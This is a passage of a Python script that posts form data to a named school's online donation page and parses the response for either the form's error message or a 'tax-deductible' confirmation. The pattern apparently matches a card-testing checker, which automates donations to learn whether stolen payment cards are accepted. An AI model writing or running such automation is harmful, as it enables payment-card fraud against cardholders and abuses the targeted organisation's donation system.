ppF2D5YbqjpP/8olCEg0BQ==',
	    '__VIEWSTATEGENERATOR': 'A5343185',
	    '__SCROLLPOSITIONX': '0',
	    '__SCROLLPOSITIONY': '2837',
	}
	
	response = session.post('https://www.queenwood.nsw.edu.au/About/Support-Us', cookies=cookies, headers=headers, data=data)
	
	try:
		result = re.search(r'id="p_lt_zoneCenter_pageplaceholder_p_lt_zoneCenterInner_DonationFormComponent_lblErrorMessage" class="small-label">(.*?)<\/label>', response.text).group(1)
	except:
		result = re.search(r'<h3>a tax-deductible (.*?)<\/h3>', response.text).group(1)
		
	return (result)
